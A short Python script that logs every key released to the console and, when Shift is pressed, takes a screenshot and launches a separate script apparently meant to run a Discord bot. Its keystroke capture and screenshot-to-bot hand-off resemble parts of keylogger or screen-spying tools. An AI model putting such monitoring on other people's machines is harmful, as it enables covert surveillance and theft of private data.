import pynput
from subprocess import call
import os
import pyautogui
from pynput.keyboard import Key,Listener
import discord
from discord.ext import commands

path = ""
dcbot_path =""
def on_release(key):
    print("{0} pressed".format(key))
    pass

def on_press(key):
    if key == Key.shift:
        ss = pyautogui.screenshot()
        ss.save(path)
        call(["python", dcbot_path])
        
    if key== Key.esc:
        print("cya")
        quit()
    pass


with Listener(on_release = on_release,on_press = on_press) as listener:
    listener.join()
